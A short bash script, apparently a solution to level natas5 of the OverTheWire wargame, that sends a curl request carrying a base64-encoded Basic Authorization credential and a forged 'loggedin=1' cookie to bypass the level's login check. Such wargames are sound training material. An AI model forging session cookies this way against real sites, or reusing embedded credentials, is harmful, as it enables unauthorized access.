#! /bin/bash

curl 'http://natas5.natas.labs.overthewire.org/' \
  -H 'Authorization: Basic bmF0YXM1OmlYNklPZm1wTjdBWU9RR1B3dG4zZlhwYmFKVkpjSGZx' \
  -H 'Cookie: loggedin=1' --compressed
